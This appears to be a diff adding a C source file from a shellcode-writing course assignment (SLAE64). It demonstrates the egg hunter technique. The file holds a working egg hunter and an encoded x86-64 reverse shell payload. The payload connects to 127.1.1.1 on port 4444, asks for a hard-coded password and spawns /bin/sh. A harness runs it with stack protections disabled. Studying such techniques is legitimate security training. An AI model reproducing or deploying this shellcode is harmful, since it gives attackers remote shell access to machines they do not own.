@@ -1,0 +1,48 @@
+/*
+ Author: Guillem Alminyana
+ Student ID: PA-14628
+ SLAE64 Assignment #2
+ =====================================
+
+This code is a POC of the Egg Hunter Technique.
+
+To set up shellcodes:
+
+ - egg_hunter: The egg hunter shellcode :-)
+ - code: This is the shellcode we want to execute. Replace here 
+		with the desireed shellcode
+
+Compile with the following options:
+
+	gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+
+To force the .text section in higher memory positions, use this compiler option
+
+	-Wl,-Ttext-segment,0x40000000
+
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+
+//#define EGG	"\x90\x50\x90\x50"
+#define EGG	"kaki"
+
+unsigned char egg_hunter[] = \
+"\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58\x48\x31\xf6\x0f\x05\x3c\xf2\x74\xe8\x68\x6b\x61\x6b\x69\x58\x52\x5f\xaf\x75\xe2\xaf\x75\xdf\xff\xe7";
+
+unsigned char code[]= EGG EGG \
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
+
+void main()
+{
+	printf("ShellCode Lenght + Eggs: %d\n", strlen(code));
+	printf("Shellcode at position: %p\n", code);
+	printf("Egg Hunter ShellCode Size: %d\n", strlen(egg_hunter));
+	printf("Egg Hunter Shellcode at position: %p\n", egg_hunter);
+
+	int (*ret)() = (int(*)())egg_hunter;
+	ret();
+}
+
